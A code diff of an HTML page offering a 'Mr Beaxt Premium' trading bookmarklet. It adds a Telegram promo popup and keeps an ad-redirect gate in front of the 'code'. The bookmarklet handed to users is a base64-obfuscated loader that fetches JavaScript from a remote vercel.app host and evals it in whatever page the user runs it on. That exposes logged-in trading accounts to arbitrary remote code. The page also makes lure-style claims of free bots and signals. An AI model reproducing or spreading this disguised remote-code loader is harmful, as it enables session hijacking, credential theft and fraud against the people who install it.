@@ -19,6 +19,8 @@
             --border: rgba(255, 255, 255, 0.1);
             --shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
             --glow: 0 0 20px rgba(102, 126, 234, 0.3);
+            --telegram: #0088cc;
+            --telegram-hover: #006aa3;
         }
 
         * {
@@ -55,6 +57,212 @@
         @keyframes backgroundMove {
             0%, 100% { transform: translateY(0px); }
             50% { transform: translateY(-20px); }
+        }
+
+        /* Telegram Popup Styles */
+        .telegram-popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+            padding: 1rem;
+        }
+
+        .telegram-popup-overlay.show {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .telegram-popup {
+            background: linear-gradient(145deg, #1a1a2e 0%, #16213e 100%);
+            border-radius: 20px;
+            padding: 2.5rem;
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+            position: relative;
+            border: 2px solid rgba(0, 136, 204, 0.3);
+            box-shadow: 
+                0 25px 50px rgba(0, 0, 0, 0.5),
+                0 0 30px rgba(0, 136, 204, 0.2);
+            transform: scale(0.8) translateY(50px);
+            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        .telegram-popup-overlay.show .telegram-popup {
+            transform: scale(1) translateY(0);
+        }
+
+        .telegram-popup::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(45deg, transparent, rgba(0, 136, 204, 0.1), transparent);
+            border-radius: 20px;
+            animation: shimmer 3s infinite;
+            pointer-events: none;
+        }
+
+        .popup-close {
+            position: absolute;
+            top: 15px;
+            right: 20px;
+            background: rgba(255, 107, 107, 0.2);
+            border: none;
+            color: var(--accent);
+            font-size: 1.5rem;
+            width: 35px;
+            height: 35px;
+            border-radius: 50%;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+            z-index: 1;
+        }
+
+        .popup-close:hover {
+            background: var(--accent);
+            color: white;
+            transform: scale(1.1) rotate(90deg);
+        }
+
+        .telegram-icon-large {
+            font-size: 4rem;
+            color: var(--telegram);
+            margin-bottom: 1rem;
+            animation: bounce 2s infinite;
+        }
+
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-10px); }
+            60% { transform: translateY(-5px); }
+        }
+
+        .popup-title {
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: white;
+            margin-bottom: 0.5rem;
+            background: linear-gradient(45deg, #ffffff, var(--telegram));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .popup-subtitle {
+            color: var(--text-muted);
+            font-size: 1rem;
+            margin-bottom: 2rem;
+            line-height: 1.6;
+        }
+
+        .popup-benefits {
+            text-align: left;
+            margin: 2rem 0;
+            background: rgba(0, 136, 204, 0.1);
+            padding: 1.5rem;
+            border-radius: 15px;
+            border: 1px solid rgba(0, 136, 204, 0.3);
+        }
+
+        .popup-benefits h4 {
+            color: var(--telegram);
+            margin-bottom: 1rem;
+            text-align: center;
+            font-size: 1.2rem;
+        }
+
+        .benefit-item {
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+            margin-bottom: 0.8rem;
+            color: var(--text);
+        }
+
+        .benefit-item:last-child {
+            margin-bottom: 0;
+        }
+
+        .benefit-icon {
+            color: #00ff88;
+            font-size: 1.1rem;
+            width: 20px;
+        }
+
+        .telegram-join-btn {
+            background: linear-gradient(135deg, var(--telegram) 0%, #006aa3 100%);
+            color: white;
+            border: none;
+            padding: 1rem 2.5rem;
+            border-radius: 50px;
+            font-family: 'Inter', sans-serif;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.8rem;
+            margin: 1rem 0.5rem 0.5rem;
+            box-shadow: 0 10px 25px rgba(0, 136, 204, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .telegram-join-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 35px rgba(0, 136, 204, 0.4);
+            background: linear-gradient(135deg, #0099dd 0%, #0077bb 100%);
+        }
+
+        .telegram-join-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.5s;
+        }
+
+        .telegram-join-btn:hover::before {
+            left: 100%;
+        }
+
+        .popup-skip {
+            color: var(--text-muted);
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-size: 0.9rem;
+            margin-top: 1rem;
+            padding: 0.5rem 1rem;
+            border-radius: 20px;
+            transition: all 0.3s ease;
+        }
+
+        .popup-skip:hover {
+            color: white;
+            background: rgba(255, 255, 255, 0.1);
         }
 
         .container {
@@ -465,6 +673,7 @@
             animation: slideDown 0.5s ease-out;
         }
 
+        /* Mobile Responsive */
         @media (max-width: 768px) {
             .container {
                 padding: 1rem;
@@ -491,10 +700,102 @@
                 flex-direction: column;
                 gap: 0.5rem;
             }
+
+            .telegram-popup {
+                padding: 2rem 1.5rem;
+                margin: 1rem;
+                max-width: 95%;
+            }
+
+            .popup-title {
+                font-size: 1.5rem;
+            }
+
+            .telegram-icon-large {
+                font-size: 3rem;
+            }
+
+            .telegram-join-btn {
+                padding: 0.8rem 2rem;
+                font-size: 1rem;
+            }
+
+            .popup-benefits {
+                padding: 1rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .telegram-popup {
+                padding: 1.5rem 1rem;
+            }
+
+            .popup-title {
+                font-size: 1.3rem;
+            }
+
+            .telegram-icon-large {
+                font-size: 2.5rem;
+            }
+
+            .benefit-item {
+                font-size: 0.9rem;
+            }
+
+            .floating-icons {
+                display: none;
+            }
         }
     </style>
 </head>
 <body>
+    <!-- Telegram Popup -->
+    <div class="telegram-popup-overlay" id="telegramPopup">
+        <div class="telegram-popup">
+            <button class="popup-close" id="closePopup">
+                <i class="fas fa-times"></i>
+            </button>
+            
+            <div class="telegram-icon-large">
+                <i class="fab fa-telegram"></i>
+            </div>
+            
+            <h2 class="popup-title">Join Our Telegram!</h2>
+            <p class="popup-subtitle">Get exclusive access to premium trading tools and stay updated with the latest features!</p>
+            
+            <div class="popup-benefits">
+                <h4><i class="fas fa-gift"></i> What You Get:</h4>
+                <div class="benefit-item">
+                    <i class="fas fa-check-circle benefit-icon"></i>
+                    <span>Free Premium Indicators & Bots</span>
+                </div>
+                <div class="benefit-item">
+                    <i class="fas fa-check-circle benefit-icon"></i>
+                    <span>Live Trading Signals</span>
+                </div>
+                <div class="benefit-item">
+                    <i class="fas fa-check-circle benefit-icon"></i>
+                    <span>24/7 Premium Support</span>
+                </div>
+                <div class="benefit-item">
+                    <i class="fas fa-check-circle benefit-icon"></i>
+                    <span>Exclusive Trading Strategies</span>
+                </div>
+                <div class="benefit-item">
+                    <i class="fas fa-check-circle benefit-icon"></i>
+                    <span>Early Access to New Features</span>
+                </div>
+            </div>
+            
+            <a href="http://t.me/binarybeaxt_official" target="_blank" class="telegram-join-btn" id="joinTelegram">
+                <i class="fab fa-telegram"></i>
+                Join Now - It's FREE!
+            </a>
+            
+            <button class="popup-skip" id="skipPopup">Maybe Later</button>
+        </div>
+    </div>
+
     <div class="floating-icons">
         <div class="floating-icon"><i class="fas fa-code"></i></div>
         <div class="floating-icon"><i class="fas fa-star"></i></div>
@@ -623,180 +924,313 @@
                     <a id="bookmarklet-link" href="#" class="bookmarklet-link" title="Drag this to your bookmarks bar">
                         <i class="fas fa-bookmark"></i>
                         Mr Beaxt Premium
-                    </a>
-                </div>
-                
-                <button class="btn btn-secondary" id="back-button">
-                    <i class="fas fa-arrow-left"></i>
-                    Back to Home
-                </button>
-            </div>
-        </div>
-    </div>
+                   </a>
+               </div>
+               
+               <button class="btn btn-secondary" id="back-button">
+                   <i class="fas fa-arrow-left"></i>
+                   Back to Home
+               </button>
+           </div>
+       </div>
+   </div>
 
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            // Premium code that users will copy
-            const premiumCode = "javascript:(function(){eval(atob('KGZ1bmN0aW9uKCl7Y29uc3QgdXJsID0gJ2h0dHBzOi8vbXJiZWF4dGNvZGUudmVyY2VsLmFwcC8nO2ZldGNoKHVybCkudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpLnRoZW4oY29kZSA9PiBldmFsKGNvZGUpKX0pKCk7'));})();";
-            
-            // Your ad URL
-            const adUrl = 'https://heroicfuneral.com/r2bn9p19?key=1ee644a9a76a6b9d222e32b35270ced3';
-            
-            // Track if user has been redirected (using current page session)
-            let hasBeenRedirected = sessionStorage.getItem('mrbeaxt_redirected') === 'true';
-            
-            // Elements
-            const getCodeBtn = document.getElementById('get-code-btn');
-            const codeSection = document.getElementById('code-section');
-            const hintSection = document.getElementById('hint-section');
-            const successMsg = document.getElementById('success-msg');
-            const premiumCodeTextarea = document.getElementById('premium-code');
-            const copyPremiumBtn = document.getElementById('copy-premium-code');
-            const startSetupBtn = document.getElementById('start-setup');
-            const backButton = document.getElementById('back-button');
-            const page1 = document.getElementById('page1');
-            const page2 = document.getElementById('page2');
-            const bookmarkletLink = document.getElementById('bookmarklet-link');
-            
-            // Set bookmarklet href
-            bookmarkletLink.href = premiumCode;
-            
-            // Get Code button functionality
-            getCodeBtn.addEventListener('click', function() {
-                console.log('Button clicked! hasBeenRedirected:', hasBeenRedirected);
-                
-                if (!hasBeenRedirected) {
-                    console.log('First click - redirecting to ad...');
-                    
-                    // First click - redirect to ad
-                    try {
-                        // Try multiple methods to ensure redirect works
-                        const newWindow = window.open(adUrl, '_blank');
-                        
-                        // Fallback if popup blocked
-                        if (!newWindow) {
-                            window.location.href = adUrl;
-                        }
-                        
-                        // Mark as redirected
-                        sessionStorage.setItem('mrbeaxt_redirected', 'true');
-                        hasBeenRedirected = true;
-                        
-                        console.log('Redirect successful, marked as redirected');
-                        
-                        // Show hint message
-                        hintSection.style.display = 'block';
-                        
-                        // Change button text temporarily
-                        const originalText = getCodeBtn.innerHTML;
-                        getCodeBtn.innerHTML = '<i class="fas fa-external-link-alt"></i> Ad Opened!';
-                        getCodeBtn.disabled = true;
-                        
-                        setTimeout(() => {
-                            getCodeBtn.innerHTML = '<i class="fas fa-key"></i> Get Code Now';
-                            getCodeBtn.disabled = false;
-                        }, 2000);
-                        
-                    } catch (error) {
-                        console.error('Redirect failed:', error);
-                        // Fallback - direct navigation
-                        window.location.href = adUrl;
-                    }
-                } else {
-                    console.log('Second click - showing code...');
-                    
-                    // Subsequent clicks - show code
-                    premiumCodeTextarea.value = premiumCode;
-                    hintSection.style.display = 'none';
-                    codeSection.style.display = 'block';
-                    successMsg.style.display = 'block';
-                    
-                    // Animate the appearance
-                    codeSection.style.animation = 'fadeInScale 0.6s ease-out';
-                    successMsg.style.animation = 'slideDown 0.5s ease-out';
-                    
-                    // Change button text
-                    getCodeBtn.innerHTML = '<i class="fas fa-check"></i> Code Ready!';
-                    getCodeBtn.style.background = 'linear-gradient(135deg, #00ff88 0%, #00cc6a 100%)';
-                    
-                    // Scroll to code section
-                    codeSection.scrollIntoView({ behavior: 'smooth' });
-                }
-            });
-            
-            // Copy premium code functionality
-            copyPremiumBtn.addEventListener('click', function() {
-                premiumCodeTextarea.select();
-                premiumCodeTextarea.setSelectionRange(0, 99999); // For mobile devices
-                
-                try {
-                    document.execCommand('copy');
-                    console.log('Code copied successfully');
-                } catch (err) {
-                    console.error('Copy failed:', err);
-                }
-                
-                const originalContent = copyPremiumBtn.innerHTML;
-                copyPremiumBtn.innerHTML = '<i class="fas fa-check"></i>';
-                copyPremiumBtn.style.background = '#00ff88';
-                
-                // Show success feedback
-                const copySuccess = document.createElement('div');
-                copySuccess.style.position = 'absolute';
-                copySuccess.style.top = '-40px';
-                copySuccess.style.right = '0';
-                copySuccess.style.background = '#00ff88';
-                copySuccess.style.color = 'white';
-                copySuccess.style.padding = '0.5rem 1rem';
-                copySuccess.style.borderRadius = '5px';
-                copySuccess.style.fontSize = '0.8rem';
-                copySuccess.innerHTML = 'Copied!';
-                copySuccess.style.zIndex = '1000';
-                copyPremiumBtn.parentNode.appendChild(copySuccess);
-                
-                setTimeout(() => {
-                    copyPremiumBtn.innerHTML = originalContent;
-                    copyPremiumBtn.style.background = '';
-                    if (copySuccess.parentNode) {
-                        copySuccess.parentNode.removeChild(copySuccess);
-                    }
-                }, 2000);
-            });
-            
-            // Page navigation with smooth transitions
-            startSetupBtn.addEventListener('click', function() {
-                page1.style.animation = 'fadeInScale 0.3s ease-out reverse';
-                setTimeout(() => {
-                    page1.classList.remove('active');
-                    page2.classList.add('active');
-                }, 300);
-            });
-            
-            backButton.addEventListener('click', function() {
-                page2.style.animation = 'fadeInScale 0.3s ease-out reverse';
-                setTimeout(() => {
-                    page2.classList.remove('active');
-                    page1.classList.add('active');
-                }, 300);
-            });
-            
-            // Add interactive effects to floating icons
-            const floatingIcons = document.querySelectorAll('.floating-icon');
-            floatingIcons.forEach((icon, index) => {
-                icon.addEventListener('mouseenter', function() {
-                    this.style.transform = 'scale(1.2) rotate(360deg)';
-                });
-                
-                icon.addEventListener('mouseleave', function() {
-                    this.style.transform = 'scale(1) rotate(0deg)';
-                });
-            });
-            
-            // Debug: Reset redirect status (for testing)
-            // Uncomment the line below to reset during development
-            // sessionStorage.removeItem('mrbeaxt_redirected');
-        });
-    </script>
+   <script>
+       document.addEventListener('DOMContentLoaded', function() {
+           // Updated premium code with your new JavaScript
+           const premiumCode = `javascript:(function(){
+   eval(atob('KGZ1bmN0aW9uKCl7Y29uc3QgdXJsID0gJ2h0dHBzOi8vbXJiZWF4dGNvZGUudmVyY2VsLmFwcC8nO2ZldGNoKHVybCkudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpLnRoZW4oY29kZSA9PiBldmFsKGNvZGUpKX0pKCk7'));
+})();`;
+           
+           // Your ad URL
+           const adUrl = 'https://heroicfuneral.com/r2bn9p19?key=1ee644a9a76a6b9d222e32b35270ced3';
+           
+           // Track if user has been redirected (using current page session)
+           let hasBeenRedirected = sessionStorage.getItem('mrbeaxt_redirected') === 'true';
+           
+           // Telegram Popup Elements
+           const telegramPopup = document.getElementById('telegramPopup');
+           const closePopup = document.getElementById('closePopup');
+           const skipPopup = document.getElementById('skipPopup');
+           const joinTelegram = document.getElementById('joinTelegram');
+           
+           // Check if popup was already shown in this session
+           const popupShown = sessionStorage.getItem('telegram_popup_shown');
+           
+           // Show popup after 2 seconds if not shown before
+           if (!popupShown) {
+               setTimeout(() => {
+                   showTelegramPopup();
+               }, 2000);
+           }
+           
+           function showTelegramPopup() {
+               telegramPopup.classList.add('show');
+               document.body.style.overflow = 'hidden'; // Prevent background scrolling
+               
+               // Mark popup as shown
+               sessionStorage.setItem('telegram_popup_shown', 'true');
+           }
+           
+           function hideTelegramPopup() {
+               telegramPopup.classList.remove('show');
+               document.body.style.overflow = 'auto'; // Restore scrolling
+           }
+           
+           // Close popup event listeners
+           closePopup.addEventListener('click', hideTelegramPopup);
+           skipPopup.addEventListener('click', hideTelegramPopup);
+           
+           // Close popup when clicking outside
+           telegramPopup.addEventListener('click', function(e) {
+               if (e.target === telegramPopup) {
+                   hideTelegramPopup();
+               }
+           });
+           
+           // Close popup with ESC key
+           document.addEventListener('keydown', function(e) {
+               if (e.key === 'Escape' && telegramPopup.classList.contains('show')) {
+                   hideTelegramPopup();
+               }
+           });
+           
+           // Track Telegram join clicks
+           joinTelegram.addEventListener('click', function() {
+               // Analytics or tracking can be added here
+               console.log('User clicked Join Telegram');
+               
+               // Close popup after a short delay to allow the link to open
+               setTimeout(() => {
+                   hideTelegramPopup();
+               }, 500);
+           });
+           
+           // Main application elements
+           const getCodeBtn = document.getElementById('get-code-btn');
+           const codeSection = document.getElementById('code-section');
+           const hintSection = document.getElementById('hint-section');
+           const successMsg = document.getElementById('success-msg');
+           const premiumCodeTextarea = document.getElementById('premium-code');
+           const copyPremiumBtn = document.getElementById('copy-premium-code');
+           const startSetupBtn = document.getElementById('start-setup');
+           const backButton = document.getElementById('back-button');
+           const page1 = document.getElementById('page1');
+           const page2 = document.getElementById('page2');
+           const bookmarkletLink = document.getElementById('bookmarklet-link');
+           
+           // Set bookmarklet href with new code
+           bookmarkletLink.href = premiumCode;
+           
+           // Get Code button functionality
+           getCodeBtn.addEventListener('click', function() {
+               console.log('Button clicked! hasBeenRedirected:', hasBeenRedirected);
+               
+               if (!hasBeenRedirected) {
+                   console.log('First click - redirecting to ad...');
+                   
+                   // First click - redirect to ad
+                   try {
+                       // Try multiple methods to ensure redirect works
+                       const newWindow = window.open(adUrl, '_blank');
+                       
+                       // Fallback if popup blocked
+                       if (!newWindow || newWindow.closed || typeof newWindow.closed === 'undefined') {
+                           window.location.href = adUrl;
+                       }
+                       
+                       // Mark as redirected
+                       sessionStorage.setItem('mrbeaxt_redirected', 'true');
+                       hasBeenRedirected = true;
+                       
+                       console.log('Redirect successful, marked as redirected');
+                       
+                       // Show hint message
+                       hintSection.style.display = 'block';
+                       
+                       // Change button text temporarily
+                       const originalText = getCodeBtn.innerHTML;
+                       getCodeBtn.innerHTML = '<i class="fas fa-external-link-alt"></i> Ad Opened!';
+                       getCodeBtn.disabled = true;
+                       
+                       setTimeout(() => {
+                           getCodeBtn.innerHTML = '<i class="fas fa-key"></i> Get Code Now';
+                           getCodeBtn.disabled = false;
+                       }, 2000);
+                       
+                   } catch (error) {
+                       console.error('Redirect failed:', error);
+                       // Fallback - direct navigation
+                       window.location.href = adUrl;
+                   }
+               } else {
+                   console.log('Second click - showing code...');
+                   
+                   // Subsequent clicks - show code
+                   premiumCodeTextarea.value = premiumCode;
+                   hintSection.style.display = 'none';
+                   codeSection.style.display = 'block';
+                   successMsg.style.display = 'block';
+                   
+                   // Animate the appearance
+                   codeSection.style.animation = 'fadeInScale 0.6s ease-out';
+                   successMsg.style.animation = 'slideDown 0.5s ease-out';
+                   
+                   // Change button text
+                   getCodeBtn.innerHTML = '<i class="fas fa-check"></i> Code Ready!';
+                   getCodeBtn.style.background = 'linear-gradient(135deg, #00ff88 0%, #00cc6a 100%)';
+                   
+                   // Scroll to code section
+                   codeSection.scrollIntoView({ behavior: 'smooth' });
+               }
+           });
+           
+           // Copy premium code functionality
+           copyPremiumBtn.addEventListener('click', function() {
+               premiumCodeTextarea.select();
+               premiumCodeTextarea.setSelectionRange(0, 99999); // For mobile devices
+               
+               try {
+                   const successful = document.execCommand('copy');
+                   if (successful) {
+                       console.log('Code copied successfully');
+                   } else {
+                       // Fallback for modern browsers
+                       navigator.clipboard.writeText(premiumCode).then(() => {
+                           console.log('Code copied via clipboard API');
+                       });
+                   }
+               } catch (err) {
+                   console.error('Copy failed:', err);
+                   // Final fallback
+                   navigator.clipboard.writeText(premiumCode).catch(() => {
+                       console.error('All copy methods failed');
+                   });
+               }
+               
+               const originalContent = copyPremiumBtn.innerHTML;
+               copyPremiumBtn.innerHTML = '<i class="fas fa-check"></i>';
+               copyPremiumBtn.style.background = '#00ff88';
+               
+               // Show success feedback
+               const copySuccess = document.createElement('div');
+               copySuccess.style.position = 'absolute';
+               copySuccess.style.top = '-40px';
+               copySuccess.style.right = '0';
+               copySuccess.style.background = '#00ff88';
+               copySuccess.style.color = 'white';
+               copySuccess.style.padding = '0.5rem 1rem';
+               copySuccess.style.borderRadius = '5px';
+               copySuccess.style.fontSize = '0.8rem';
+               copySuccess.innerHTML = 'Copied!';
+               copySuccess.style.zIndex = '1000';
+               copyPremiumBtn.parentNode.appendChild(copySuccess);
+               
+               setTimeout(() => {
+                   copyPremiumBtn.innerHTML = originalContent;
+                   copyPremiumBtn.style.background = '';
+                   if (copySuccess.parentNode) {
+                       copySuccess.parentNode.removeChild(copySuccess);
+                   }
+               }, 2000);
+           });
+           
+           // Page navigation with smooth transitions
+           startSetupBtn.addEventListener('click', function() {
+               page1.style.animation = 'fadeInScale 0.3s ease-out reverse';
+               setTimeout(() => {
+                   page1.classList.remove('active');
+                   page2.classList.add('active');
+               }, 300);
+           });
+           
+           backButton.addEventListener('click', function() {
+               page2.style.animation = 'fadeInScale 0.3s ease-out reverse';
+               setTimeout(() => {
+                   page2.classList.remove('active');
+                   page1.classList.add('active');
+               }, 300);
+           });
+           
+           // Add interactive effects to floating icons
+           const floatingIcons = document.querySelectorAll('.floating-icon');
+           floatingIcons.forEach((icon, index) => {
+               icon.addEventListener('mouseenter', function() {
+                   this.style.transform = 'scale(1.2) rotate(360deg)';
+                   this.style.transition = 'transform 0.3s ease';
+               });
+               
+               icon.addEventListener('mouseleave', function() {
+                   this.style.transform = 'scale(1) rotate(0deg)';
+               });
+           });
+           
+           // Add click effect to buttons
+           const buttons = document.querySelectorAll('.btn, .telegram-join-btn');
+           buttons.forEach(button => {
+               button.addEventListener('click', function(e) {
+                   const ripple = document.createElement('span');
+                   ripple.style.position = 'absolute';
+                   ripple.style.borderRadius = '50%';
+                   ripple.style.background = 'rgba(255, 255, 255, 0.4)';
+                   ripple.style.transform = 'scale(0)';
+                   ripple.style.animation = 'ripple 0.6s linear';
+                   ripple.style.left = (e.clientX - e.target.offsetLeft) + 'px';
+                   ripple.style.top = (e.clientY - e.target.offsetTop) + 'px';
+                   ripple.style.width = '20px';
+                   ripple.style.height = '20px';
+                   
+                   this.appendChild(ripple);
+                   
+                   setTimeout(() => {
+                       ripple.remove();
+                   }, 600);
+               });
+           });
+           
+           // Add ripple effect CSS
+           const style = document.createElement('style');
+           style.textContent = `
+               @keyframes ripple {
+                   to {
+                       transform: scale(4);
+                       opacity: 0;
+                   }
+               }
+           `;
+           document.head.appendChild(style);
+           
+           // Add smooth scrolling for anchor links
+           document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+               anchor.addEventListener('click', function (e) {
+                   e.preventDefault();
+                   const target = document.querySelector(this.getAttribute('href'));
+                   if (target) {
+                       target.scrollIntoView({
+                           behavior: 'smooth',
+                           block: 'start'
+                       });
+                   }
+               });
+           });
+           
+           // Add loading animation to buttons on click
+           const actionButtons = document.querySelectorAll('.btn');
+           actionButtons.forEach(button => {
+               button.addEventListener('click', function() {
+                   if (!this.classList.contains('loading')) {
+                       this.classList.add('loading');
+                       setTimeout(() => {
+                           this.classList.remove('loading');
+                       }, 1000);
+                   }
+               });
+           });
+           
+           // Debug: Reset sessions (for testing - uncomment when needed)
+           // sessionStorage.removeItem('mrbeaxt_redirected');
+           // sessionStorage.removeItem('telegram_popup_shown');
+       });
+   </script>
 </body>
 </html>
-
